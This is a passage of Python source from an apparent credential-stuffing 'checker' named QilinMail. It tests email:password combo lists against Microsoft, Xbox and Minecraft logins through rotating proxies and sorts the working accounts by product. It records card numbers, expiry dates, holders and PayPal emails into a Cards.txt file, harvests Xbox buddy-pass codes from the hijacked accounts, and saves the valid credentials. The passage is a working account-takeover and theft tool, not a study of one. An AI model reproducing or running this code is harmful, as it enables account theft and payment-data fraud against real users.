                paymentprint += f' | Balance: {balance}'
            if subscription1:
                payment += f'\n{subscription1}'
                paymentprint += f' | {subscription1}'
            if subscription2:
                payment += f'\n{subscription2}'
                paymentprint += f' | {subscription2}'
            if subscription3:
                payment += f'\n{subscription3}'
                paymentprint += f' | {subscription3}'
            if has_payment_method or balance or subscription1 or subscription2 or subscription3:
                if credit_card and last4:
                    card_capture = f'{email}:{password} | Card: {credit_card} | Last4: {last4} | Exp: {expiry_month}/{expiry_year} | Type: {card_type} | Holder: {card_holder}'
                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
                        f.write(card_capture + '\n')
                    if UI_ENABLED and ui:
                        ui.log_info(f'Card captured: {credit_card} ending {last4}')
                if paypal_email:
                    paypal_capture = f"{email}:{password} | PayPal: {paypal_email} | Holder: {fullname or 'N/A'}"
                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
                        f.write(paypal_capture + '\n')
                    if UI_ENABLED and ui:
                        ui.log_info(f'PayPal captured: {paypal_email}')
                payment += '\n============================\n'
                payment_methods += 1
                if UI_ENABLED and ui:
                    ui.log_payment(email, 'Payment methods found')
            break
        except Exception as e:
            retries += 1
            session.proxies = getproxy()
            time.sleep(2)
def validmail(email, password):
    global vm, cpm, checked
    vm += 1
    cpm += 1
    checked += 1
    with open(f'results/{fname}/Valid_Mail.txt', 'a') as file:
        file.write(f'{email}:{password}\n')
    meowapi_stats = ''
    try:
        username = email.split('@')[0]
        if username:
            stats = fetch_meowapi_stats(username)
            if stats:
                meowapi_stats = f' | MeowAPI: {stats}'
    except Exception:
        pass
    if UI_ENABLED and ui:
        ui.add_log(f'Valid Mail: {email}{meowapi_stats}', 'SUCCESS')
def capture_mc(access_token, session, email, password, type):
    global retries
    attempts = 0
    while attempts < maxretries:
        attempts += 1
        try:
            pass
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=min(12 + (attempts - 1) * 2, 18))
            if r.status_code == 200:
                data = {}
                try:
                    data = r.json()
                except Exception:
                    data = {}
                name = data.get('name', 'N/A') or 'N/A'
                uuid = data.get('id', 'N/A') or 'N/A'
                try:
                    capes = ', '.join([cape.get('alias') for cape in data.get('capes', []) if cape.get('alias')])
                except Exception:
                    capes = ''
                CAPTURE = Capture(email, password, name, capes, uuid, access_token, type, session)
                CAPTURE.handle(session)
                break
            elif r.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                time.sleep(0.5 if len(proxylist) > 0 else 1)
                continue
            else:
                CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
                CAPTURE.handle(session)
                break
        except Exception:
            retries += 1
            session.proxies = getproxy()
            time.sleep(0.1)
            if attempts >= maxretries:
                try:
                    CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
                    CAPTURE.handle(session)
                except Exception:
                    pass
            continue
def checkownership(entitlements_response):
    items = entitlements_response.get('items', [])
    has_mc = False
    has_gp_pc = False
    has_gp_ult = False

    _MC_NAMES = {
        'game_minecraft', 'product_minecraft', 'product_game_minecraft',
        'minecraft', 'game_minecraft_bedrock', 'product_minecraft_java',
        'product_minecraft_bedrock', 'game_minecraft_java_edition',
    }
    _GP_PC_NAMES  = {'product_game_pass_pc', 'game_pass_pc', 'pc_game_pass', 'gamepass_pc'}
    _GP_ULT_NAMES = {
        'product_game_pass_ultimate', 'game_pass_ultimate',
        'product_xbox_game_pass_ultimate', 'xbox_game_pass_ultimate',
        'game_pass_ultimate_monthly',
    }
    _GP_SOURCES = {
        'GAME_PASS', 'GAME_PASS_PC', 'GAME_PASS_ULTIMATE',
        'XBOX_GAME_PASS', 'XBOX_GAME_PASS_ULTIMATE', 'SUBSCRIPTION',
    }
    _MC_SOURCES = {
        'PURCHASE', 'MC_PURCHASE', 'MARKETPLACE', 'DLCTRACKING',
        'ENTITLEMENT', 'LICENSE', '', 'null',
    }

    for item in items:
        name   = str(item.get('name',   '') or '').lower().strip()
        source = str(item.get('source', '') or '').upper().strip()

        # Minecraft ownership — sadece name yeterli, source strict olmasın
        if name in _MC_NAMES:
            has_mc = True
        # Source'dan da anlıyabiliriz
        if source in _MC_SOURCES and any(kw in name for kw in ('minecraft', 'game_')):
            has_mc = True

        # Game Pass Ultimate
        if name in _GP_ULT_NAMES or source in ('GAME_PASS_ULTIMATE', 'XBOX_GAME_PASS_ULTIMATE'):
            has_gp_ult = True
        # Game Pass PC
        if name in _GP_PC_NAMES or source in ('GAME_PASS', 'GAME_PASS_PC'):
            has_gp_pc = True

    if has_mc and has_gp_ult:  return 'Normal Minecraft (with Game Pass Ultimate)'
    if has_mc and has_gp_pc:   return 'Normal Minecraft (with Game Pass)'
    if has_mc:                 return 'Normal Minecraft'
    if has_gp_ult:             return 'Xbox Game Pass Ultimate'
    if has_gp_pc:              return 'Xbox Game Pass (PC)'
    # Son şans: items varsa ama tanınamıyorsa → Normal Minecraft say
    if items and any('minecraft' in str(i).lower() for i in items):
        return 'Normal Minecraft'
    return None
def claim_buddypass_offers(session, xbox_token, fname):
    global retries
    codes = []
    try:
        xsts = None
        for _ in range(maxretries):
            try:
                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'http://mp.microsoft.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
                break
            except Exception:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    time.sleep(20)
                continue
        else:
            return

        js = xsts.json()
        if 'DisplayClaims' not in js or 'xui' not in js['DisplayClaims']: return
        uhss = js['DisplayClaims']['xui'][0]['uhs']
        xsts_token = js.get('Token')
        headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Authorization': f'XBL3.0 x={uhss};{xsts_token}', 'Ms-Cv': 'OgMi8P4bcc7vra2wAjJZ/O.19', 'Origin': 'https://www.xbox.com', 'Priority': 'u=1, i', 'Referer': 'https://www.xbox.com/', 'Sec-Ch-Ua': '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0', 'X-Ms-Api-Version': '1.0'}
        
        r = None
        for _ in range(maxretries):
            try:
                r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers, timeout=int(config.get('timeout', 10)))
                break
            except Exception:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    time.sleep(20)
                continue
        else:
            return

        if 'offerid' in r.text.lower():
            offers = r.json()['offers']
            current_time = datetime.now(timezone.utc)
            for offer in offers:
                codes.append(offer['offerId'])
            
            if len(offers) < 5:
                for _ in range(3):
                    try:
                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                        if 'offerId' in r.text:
                            offers = r.json()['offers']
                            current_time = datetime.now(timezone.utc)
                            valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
                            
                            for offer in valid_offer_ids:
                                write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                                
                            shouldContinue = False
                            for offer in offers:
                                if offer['offerId'] not in codes:
                                    shouldContinue = True
                            for offer in offers:
                                codes.append(offer['offerId'])
                            if not shouldContinue:
                                break
                        else:
                            break
                    except Exception:
                        retries += 1
                        session.proxies = getproxy()
                        if len(proxylist) == 0:
                            time.sleep(20)
                        continue
        else:
             for _ in range(3):
                try:
                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                    if 'offerId' in r.text:
                        offers = r.json()['offers']
                        current_time = datetime.now(timezone.utc)
                        valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
                        for offer in valid_offer_ids:
                            write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                        shouldContinue = False
                        for offer in offers:
                            if offer['offerId'] not in codes:
                                shouldContinue = True
                        for offer in offers:
                            codes.append(offer['offerId'])
                        if not shouldContinue:
                            break
                    else:
                        break
                except Exception:
                    retries += 1
                    session.proxies = getproxy()
                    if len(proxylist) == 0:
                        time.sleep(20)
                    continue
    except Exception:
        pass

def checkmc(session, email, password, token, xbox_token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other, config
    acctype  = None
    checkrq  = None
    attempts = 0
    max_time = time.time() + 40
    _hdrs    = {'Authorization': f'Bearer {token}', 'User-Agent': 'Mozilla/5.0'}
    # ── ADIM 1: Profile endpoint önce — en güvenilir yöntem ──
    _profile_data = None
    try:
        _pr = session.get(
            'https://api.minecraftservices.com/minecraft/profile',
            headers=_hdrs, timeout=_safe_t(10), verify=False)
        if _pr.status_code == 200:
            _pd = _pr.json()
            if _pd.get('id') and _pd.get('name'):
                _profile_data = _pd
                acctype = 'Normal Minecraft'  # profile varsa kesin sahip
        elif _pr.status_code in (401, 403):
            return False  # token geçersiz
    except Exception:
        pass

    # ── ADIM 2: Entitlements — acctype'ı daha iyi belirle (GP vs Normal) ──
    for _eu in [
        'https://api.minecraftservices.com/entitlements/mcstore',
        'https://api.minecraftservices.com/entitlements/license',
    ]:
        if time.time() >= max_time: break
        attempts = 0
        while attempts < maxretries and time.time() < max_time:
            attempts += 1
            try:
                checkrq = session.get(_eu, headers=_hdrs, verify=False, timeout=_safe_t(7))
                if checkrq.status_code == 429:
                    with stats_lock: retries += 1
                    _hpx = getproxy() if proxylist else None
                    if _hpx: session.proxies = _hpx
                    time.sleep(0.5 if proxylist else 1.5)
                    continue
                elif checkrq.status_code == 200:
                    _ent_type = checkownership(checkrq.json())
                    if _ent_type:  # entitlements daha spesifik tür döndürdüyse kullan
                        acctype = _ent_type
                    break
                elif checkrq.status_code in (401, 403):
                    break
                else:
                    break
            except (requests.exceptions.Timeout, requests.exceptions.ConnectTimeout):
                with stats_lock: retries += 1
                _hpx = getproxy() if proxylist else None
                if _hpx: session.proxies = _hpx
                time.sleep(0.2)
            except Exception:
                with stats_lock: retries += 1
                time.sleep(0.1)
                break
        if acctype and acctype != 'Normal Minecraft': break

    # ── ADIM 3: Hâlâ None ise ve profil varsa Normal Minecraft say ──
    if acctype is None:
        if _profile_data and _profile_data.get('id'):
            acctype = 'Normal Minecraft'
        else:
            return False

    if time.time() >= max_time:
        if UI_ENABLED and ui: ui.log_error(f'Timeout checkmc: {email[:20]}')
        # Timeout olsa bile profile varsa devam et
        if not acctype: return False


    # ── Profil çek: name, uuid, capes ──────────────────────────
    name, uuid_str, capes_list = 'N/A', 'N/A', []
    # _profile_data zaten ADIM 1'de çekildi, tekrar istek yapmaya gerek yok
    _pd2 = _profile_data or {}
    if not _pd2:
        try:
            profilerq = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers=_hdrs, timeout=_safe_t(8), verify=False)
            if profilerq.status_code == 200:
                _pd2 = profilerq.json()
        except Exception:
            pass
    name     = _pd2.get('name', 'N/A') or 'N/A'
    uuid_str = _pd2.get('id', 'N/A') or 'N/A'
    for _c in _pd2.get('capes', []):
        if _c.get('alias'): capes_list.append(_c['alias'])

    capes_str = ', '.join(capes_list)

    # ── Capture oluştur ve handle() çalıştır ───────────────────
    try:
        _cap = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
        if 'Game Pass' not in acctype:
            _cap.handle(session)
    except Exception as _ce:
        if UI_ENABLED and ui: ui.log_error(f'Capture error: {_ce}')

    # ── Tip bazlı dosya yaz + sayaç artır ─────────────────────
    if acctype in ('Xbox Game Pass Ultimate', 'Normal Minecraft (with Game Pass Ultimate)'):
        with stats_lock: xgpu += 1
        write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
        if 'Normal' in acctype: write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
        try: claim_buddypass_offers(session, xbox_token, fname)
        except: pass
        capture_mc(token, session, email, password, acctype)
        return True
    elif acctype in ('Xbox Game Pass (PC)', 'Normal Minecraft (with Game Pass)'):
        with stats_lock: xgp += 1
        write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
        if 'Normal' in acctype: write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
        try: claim_buddypass_offers(session, xbox_token, fname)
        except: pass
        try: capture_mc(token, session, email, password, acctype)
        except: pass
        return True
    elif acctype == 'Normal Minecraft':
        write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
        return True
    else:
        try: capture_mc(token, session, email, password, acctype)
        except: pass
        return True
def mc_token(session, uhs, xsts_token):
    global retries
    attempts = 0
    while attempts < maxretries:
        attempts += 1
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=_safe_t(10))
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                time.sleep(0.5 if len(proxylist) > 0 else 2)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(0.1)
            continue
    return None
RE_SFTTAG_VALUE = re.compile(r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"', re.S)
RE_URLPOST_VALUE = re.compile(r'"urlPost":"(.+?)"|urlPost:\'(.+?)\'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"', re.S)
RE_IPT = re.compile(r'(?<="ipt" value=").+?(?=">)')
RE_PPRID = re.compile(r'(?<="pprid" value=").+?(?=">)')
RE_UAID = re.compile(r'(?<="uaid" value=").+?(?=">)')
RE_ACTION_FMHF = re.compile(r'(?<=id="fmHF" action=").+?(?=" )')
RE_RETURN_URL = re.compile(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)')

def create_optimized_session():
    session = requests.Session()
    session.verify = False
    
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
    
    _pool = min(32, (len(proxylist) // 10) + 16) if 'proxylist' in globals() and proxylist else 24
    use_proxies = bool('proxylist' in globals() and proxylist)
    backoff = 0.3 if use_proxies else 0.8
    retry_strategy = Retry(
        total=2, connect=2, read=2, backoff_factor=backoff,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=frozenset(['GET', 'POST']),
        raise_on_status=False,
    )
    adapter = HTTPAdapter(pool_connections=_pool, pool_maxsize=_pool * 2, max_retries=retry_strategy)
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    return session
def authenticate(email, password, use_optimized=False):
    global retries, bad, checked, cpm, twofa
    
    current_try = 0
    counters_incremented = False
    
    session = create_optimized_session() if use_optimized else requests.Session()
    try:
        if proxytype != "'4'" and proxylist:
            _px0 = getproxy()
            if _px0: session.proxies = _px0
    except Exception: pass
    while current_try <= maxretries:
        try:
            session.cookies.clear()
            try:
                if proxytype != "'4'" and proxylist:
                    _px = getproxy()
                    if _px: session.proxies = _px
            except Exception: pass
            
            urlPost, sFTTag, session = get_urlPost_sFTTag(session)
            if urlPost is None or sFTTag is None:
                if not counters_incremented:
                    if UI_ENABLED and ui:
                        ui.log_bad(email)
                if current_try >= maxretries:
                     return False
                return False

            token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
            
            if token == '2FA':
                twofa += 1
                if not counters_incremented:
                    if UI_ENABLED and ui:
                        ui.log_2fa(email)
                return False
                
            elif token == 'None' or token is None:
                if not counters_incremented:
                    if UI_ENABLED and ui:
                        ui.log_bad(email)
                return False
            
            if token != 'None' and token != '2FA':
                hit = False
                try:
                    xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
                    js = xbox_login.json()
                    xbox_token = js.get('Token')
                    
                    if xbox_token is not None:
                        # DisplayClaims güvenli okuma
                        try:
                            uhs = js['DisplayClaims']['xui'][0]['uhs']
                        except (KeyError, IndexError, TypeError):
                            uhs = js.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs') if js.get('DisplayClaims') else None
                        if not uhs:
                            raise ValueError('uhs token alınamadı')
                        xsts = session.post(
                            'https://xsts.auth.xboxlive.com/xsts/authorize',
                            json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]},
                                  'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'},
                            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                            timeout=int(config.get('timeout', 10)))
                        js = xsts.json()
                        xsts_token = js.get('Token')
                        # XSTS hata kontrolü
                        if xsts_token is None:
                            _xerr = js.get('XErr')
                            if _xerr in (2148916233, 2148916238):
                                # Bölge kısıtı / minor hesap
                                with stats_lock: other += 1
                                return False
                        if xsts_token is not None:
                            access_token = mc_token(session, uhs, xsts_token)
                            if access_token is not None:
                                hit = checkmc(session, email, password, access_token, xbox_token)
                except Exception as e:
                    pass
                
                if config.get('payment') is True:
                    try:
                        payment(session, email, password)
                    except:
                        pass
                
                if check_microsoft_account and (config.get('check_microsoft_balance') or config.get('check_reward_points') or config.get('scan_inbox')):
                    try:
                        ms_results = check_microsoft_account(session, email, password, config.data, fname)
                    except:
                        pass
                
                if hit is False or hit is None:
                    validmail(email, password)
                    counters_incremented = True
                    try: session.close()
                    except: pass
                    return False
                else:
                    counters_incremented = True
                    try: session.close()
                    except: pass
                    return True
                
        except Exception as e:
            current_try += 1
            with stats_lock: retries += 1
            if UI_ENABLED and ui and (current_try == 1):
                ui.log_error(f'[{email}] Auth exception: {type(e).__name__}, retrying...')
            
            try:
                session.close()
            except:
                pass
                
            if current_try > maxretries:
                 if not counters_incremented:
                    pass
                 if UI_ENABLED and ui:
                    ui.log_error(f'[{email}] Failed after {maxretries} retries: {type(e).__name__}')
                    ui.log_bad(email)
                 return False

def fetch_proxies_from_api(proxy_type='http'):
    global proxylist, last_proxy_fetch, proxy_api_url, proxy_request_num, proxy_time, api_socks4, api_socks5, api_http
    try:
        current_time = time.time()
        if last_proxy_fetch > 0 and current_time - last_proxy_fetch < proxy_time * 60:
            return True
        api_sources = []
        if proxy_api_url:
            api_sources = [proxy_api_url]
            print(f'{Fore.CYAN}[INFO] Using custom proxy API{Fore.RESET}')
        elif proxy_type == 'socks4':
            api_sources = api_socks4
            print(f'{Fore.CYAN}[INFO] Using free SOCKS4 proxy sources{Fore.RESET}')
        elif proxy_type == 'socks5':
            api_sources = api_socks5
            print(f'{Fore.CYAN}[INFO] Using free SOCKS5 proxy sources{Fore.RESET}')
        elif proxy_type == 'http':
            api_sources = api_http
            print(f'{Fore.CYAN}[INFO] Using free HTTP/HTTPS proxy sources{Fore.RESET}')
        else:
            print(f'{Fore.YELLOW}[WARNING] Unknown proxy type: {proxy_type}{Fore.RESET}')
            return False
        if not api_sources:
            return False
        print(f'\n{Fore.CYAN}[INFO] Fetching proxies from {len(api_sources)} API source(s)...{Fore.RESET}')
        all_proxies = []
        success_count = 0
        for idx, api_url in enumerate(api_sources, 1):
            try:
                print(f'{Fore.CYAN}[{idx}/{len(api_sources)}] Fetching from: {api_url[:60]}...{Fore.RESET}')
                response = requests.get(api_url, timeout=_safe_t(10))
                if response.status_code == 200:
                    new_proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
                    if new_proxies:
                        all_proxies.extend(new_proxies)
                        success_count += 1
                        print(f'{Fore.GREEN}[✓] Fetched {len(new_proxies)} proxies{Fore.RESET}')
                    else:
                        print(f'{Fore.YELLOW}[⚠] No proxies returned{Fore.RESET}')
                else:
                    print(f'{Fore.RED}[✗] Status code: {response.status_code}{Fore.RESET}')
            except Exception as e:
                print(f'{Fore.RED}[✗] Failed: {str(e)[:50]}{Fore.RESET}')
                continue
        if all_proxies:
            all_proxies = list(set(all_proxies))
            if proxy_request_num > 0:
                all_proxies = all_proxies[:proxy_request_num]
            proxylist = all_proxies
            last_proxy_fetch = current_time
            print(f'{Fore.GREEN}[SUCCESS] Total: {len(proxylist)} unique proxies loaded from {success_count}/{len(api_sources)} sources{Fore.RESET}')
            print(f'{Fore.CYAN}[INFO] Next refresh in {proxy_time} minutes{Fore.RESET}')
            if UI_ENABLED and ui:
                ui.log_info(f'Fetched {len(proxylist)} {proxy_type} proxies from {success_count} API sources')
            return True
        else:
            print(f'{Fore.RED}[ERROR] No proxies fetched from any source{Fore.RESET}')
            return False
    except Exception as e:
        print(f'{Fore.RED}[ERROR] Failed to fetch proxies from API: {str(e)}{Fore.RESET}')
        return False

failed_proxies = set()
proxy_failure_count = {}
PROXY_FAILURE_THRESHOLD = 3
proxy_blacklist_lock = threading.Lock()

def mark_proxy_failed(proxy_str):
    global failed_proxies, proxy_failure_count
    if not proxy_str:
        return
    with proxy_blacklist_lock:
        if proxy_str not in proxy_failure_count:
            proxy_failure_count[proxy_str] = 0
        proxy_failure_count[proxy_str] += 1
        
        if proxy_failure_count[proxy_str] >= PROXY_FAILURE_THRESHOLD:
            failed_proxies.add(proxy_str)


def getproxy():
    global auto_proxy, last_proxy_fetch, proxy_time, proxylist, proxytype
    proxy_protocol = 'http'
    if proxytype == "'2'":
        proxy_protocol = 'socks4'
    elif proxytype == "'3'":
        proxy_protocol = 'socks5'
    elif proxytype == "'4'":
        return {}
    if auto_proxy and len(proxylist) == 0:
        fetch_proxies_from_api(proxy_protocol)
    elif auto_proxy and last_proxy_fetch > 0 and (time.time() - last_proxy_fetch >= proxy_time * 60):
        fetch_proxies_from_api(proxy_protocol)
    if len(proxylist) > 0:
        available_proxies = [p for p in proxylist if p not in failed_proxies]
        
        if len(available_proxies) == 0 and len(proxylist) > 0:
            failed_proxies.clear()
            proxy_failure_count.clear()
            available_proxies = proxylist
        
        if len(available_proxies) > 0:
            proxy = random.choice(available_proxies)
        else:
            return {}
            
        if UI_ENABLED and ui:
            ui.log_info(f'Using proxy: {proxy[:10]}... ({proxy_protocol})')
        if proxytype == "'2'":
            protocol_prefix = 'socks4'
        elif proxytype == "'3'":
            protocol_prefix = 'socks5'
        else:
            protocol_prefix = 'http'
        try:
            if '@' in proxy:
                proxy_url = f'{protocol_prefix}://{proxy}'
                return {'http': proxy_url, 'https': proxy_url}
            parts = proxy.split(':')
            if len(parts) == 2:
                ip, port = parts
                proxy_url = f'{protocol_prefix}://{ip}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
            elif len(parts) == 4:
                ip, port, username, password = parts
                proxy_url = f'{protocol_prefix}://{username}:{password}@{ip}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
            elif len(parts) == 3 and ';' in parts[2]:
                ip, port, auth = parts
                user, password = auth.split(';', 1)
                proxy_url = f'{protocol_prefix}://{user}:{password}@{ip}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
            else:
                proxy_url = f'{protocol_prefix}://{proxy}'
                return {'http': proxy_url, 'https': proxy_url}
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Proxy format error: {str(e)}')
            return {}
    return {}
def Checker(combo):
    global bad, checked, cpm, hits, errors
    start_time = time.time()
    try:
        warn_threshold = int(config.get('slow_check_warn_seconds', 75))
    except Exception:
        warn_threshold = 75
    warn_on_slow = bool(config.get('warn_on_slow_check', False))
    wait_if_paused()  # P tuşu basıldıysa burada bekle
    _combo_start = time.time()
    _COMBO_MAX_SECS = 30  # hard kill per combo
    try:
        combo = combo.strip()
        if not combo_pre_filter(combo):
            with stats_lock:
                bad += 1
                checked += 1
                cpm += 1
            if UI_ENABLED and ui:
                ui.log_bad(combo.split(':')[0] if ':' in combo else combo)
                ui.log_info('Invalid combo format')
            return
        split = combo.split(':', 1)
        email = split[0].strip()
        password = split[1].strip() if len(split) > 1 else ''
        if is_already_checked(email):
            with stats_lock:
                bad += 1; checked += 1; cpm += 1
            return
        mark_email_checked(email)
        if not email or not password:
            with stats_lock:
                bad += 1
                checked += 1
                cpm += 1
            if UI_ENABLED and ui:
                ui.log_bad(email or 'empty')
                ui.log_info('Empty email or password')
            return
        result = False
        try:
            result = authenticate(str(email), str(password), use_optimized=True)
            if warn_on_slow and time.time() - start_time > warn_threshold:
                if UI_ENABLED and ui:
                    ui.add_log(f'Other: Slow check (> {warn_threshold}s): {email}', 'INFO')
        except TimeoutError:
            if UI_ENABLED and ui:
                ui.log_error(f'Account check taking too long: {email}')
            result = False
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Error checking {email}: {str(e)[:50]}')
            result = False
        with stats_lock:
            checked += 1
            cpm += 1
        if result:
            pass
        else:
            with stats_lock:
                bad += 1
            if UI_ENABLED and ui:
                ui.log_bad(email)
            if config.get('save_bad', False):
                with open(f'results/{fname}/Bads.txt', 'a') as f:
                    f.write(f'{email}:{password}\n')
    except Exception as e:
        with stats_lock:
            bad += 1
            checked += 1
            cpm += 1
            errors += 1
        if UI_ENABLED and ui:
            ui.log_bad(combo.split(':')[0] if ':' in combo else combo.strip())
            ui.log_error(f'Error: {str(e)[:50]}')
def logscreen():
    global cpm, cpm1, screen, hits, bad, twofa, mfa, sfa, xgp, xgpu, vm, other, checked, retries, errors
    total_combos = len(Combos)
    _start_proxy_health_monitor()
    try:
        import threading as _thr_kb
        _kb = _thr_kb.Thread(target=_pause_keyboard_listener, daemon=True)
        _kb.start()
    except: pass
    _cpm_window  = []  # (timestamp, delta) sliding window
    _last_checked = 0
    _window_secs  = 60
    while checked < total_combos:
        _now   = time.time()
        _delta = checked - _last_checked
        if _delta > 0:
            _cpm_window.append((_now, _delta))
            _last_checked = checked
        _cpm_window = [(_t, _c) for _t, _c in _cpm_window if _now - _t <= _window_secs]
        if len(_cpm_window) >= 2:
            _wt = sum(_c for _, _c in _cpm_window)
            _we = _now - _cpm_window[0][0]
            if _we >= 1.0:
                cpm1 = int((_wt / _we) * 60)
        elif len(_cpm_window) == 1:
            cpm1 = _cpm_window[0][1] * 60
        else:
            cpm1 = 0
        cpm = 0
        try:
            if UI_ENABLED and sys.platform == 'win32' and ui:
                title_stats = f"QilinMail | Checked: {checked}/{total_combos} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - XGP: {xgp} - XGPU: {xgpu} - Valid Mail: {vm} - Other: {other} - CPM: {cpm1} - Retries: {retries} - Errors: {errors}"
                utils.set_title(title_stats)
        except:
            pass
        if UI_ENABLED and ui:
            ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm1, retries=retries, errors=errors)
            ui.show_ui_screen()
        time.sleep(0.3)
    # ── Döngü bitti — stdout geri yükle ──
    if UI_ENABLED and ui:
        try: ui.stop_checking()
        except: pass


def load_proxy_file():
    global proxylist
    filename = None
    default_file = 'proxies.txt'
    if os.path.exists(default_file):
        print(f"✓ Found '{default_file}' in current directory!")
        try:
            use_default = input('Use this file? (Y/n): ').strip().lower()
        except EOFError:
            use_default = 'y'
        if use_default != 'n':
            filename = default_file
    if filename is None:
        print('⚠ No proxy file found or selected.')
        try:
            filename = input('Load Proxy: ').strip()
        except EOFError:
            pass
        filename = filename.strip('"').strip("'")
    if not filename or not os.path.exists(filename):
        print(f"✗ Invalid file path or file doesn't exist.")
        print('Continuing without proxies...')
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            proxylist = [line.strip() for line in f if line.strip()]
        print(f'✓ [{len(proxylist)}] Proxies Loaded.')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(proxylist)} proxies loaded')
    except Exception as e:
        print(f'✗ Error reading proxy file: {str(e)}')
        time.sleep(0.5)
def _browse_file():
    """Tkinter file dialog ile .txt dosyası seç."""
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.wm_attributes('-topmost', True)
        root.lift()
        fp = filedialog.askopenfilename(
            title='Combo dosyasını seç',
            filetypes=[('Text files', '*.txt'), ('All files', '*.*')],
            parent=root,
        )
        root.destroy()
        return fp if fp else None
    except Exception:
        return None


def Load():
    global Combos, fname
    print(f"\n{Fore.BLUE}{'=' * 60}")
    print(f"{Fore.CYAN}  📂 COMBO DOSYASI SEÇ")
    print(f"{Fore.BLUE}  [1] Otomatik arama (acc.txt / combo.txt / combos.txt)")
    print(f"{Fore.BLUE}  [2] Dosya seçici (Browse)")
